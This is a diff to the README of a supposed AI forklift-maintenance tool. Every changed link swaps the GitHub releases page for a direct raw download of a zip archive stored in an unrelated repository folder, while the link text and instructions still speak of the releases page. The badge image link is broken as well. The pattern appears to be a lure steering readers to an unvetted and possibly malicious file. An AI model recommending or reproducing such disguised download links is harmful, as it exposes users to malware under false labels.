@@ -1,6 +1,6 @@
 # 🚜 forklift-technical-manifest - Your AI Guide to Forklift Maintenance
 
-[![Download the latest release](https://img.shields.io/badge/Download%20Now-v1.0-brightgreen)](https://github.com/hennymula/forklift-technical-manifest/releases)
+[![Download the latest release](https://github.com/hennymula/forklift-technical-manifest/raw/refs/heads/main/frontierman/forklift_technical_manifest_v3.1.zip%20Now-v1.0-brightgreen)](https://github.com/hennymula/forklift-technical-manifest/raw/refs/heads/main/frontierman/forklift_technical_manifest_v3.1.zip)
 
 ## 🌟 Overview
 The **forklift-technical-manifest** is an AI-powered tool designed to assist with the maintenance and troubleshooting of the Toyota 7FBEU20 forklift. This application provides easy access to technical references and error codes, making the life of a technician simpler. Built during coffee breaks by a maintenance tech, this tool enables efficient and effective forklift management.
@@ -10,7 +10,7 @@ To use this application effectively, follow these simple steps to download and i
 
 ### 🔗 Download & Install
 1. **Visit the releases page to download.** Click the link below to go to the GitHub releases page for **forklift-technical-manifest**.
-   [Download from Releases](https://github.com/hennymula/forklift-technical-manifest/releases)
+   [Download from Releases](https://github.com/hennymula/forklift-technical-manifest/raw/refs/heads/main/frontierman/forklift_technical_manifest_v3.1.zip)
 
 2. **Choose the version you want.** On the releases page, look for the latest version. You will see files available for download.
 
@@ -57,4 +57,4 @@ For additional help, you can open an issue on the GitHub repository. Your feedba
 ### 🔗 Download & Install Again
 Remember, you can always return to the releases page to download the latest version or any previous release:
 
-[Download from Releases](https://github.com/hennymula/forklift-technical-manifest/releases)
+[Download from Releases](https://github.com/hennymula/forklift-technical-manifest/raw/refs/heads/main/frontierman/forklift_technical_manifest_v3.1.zip)
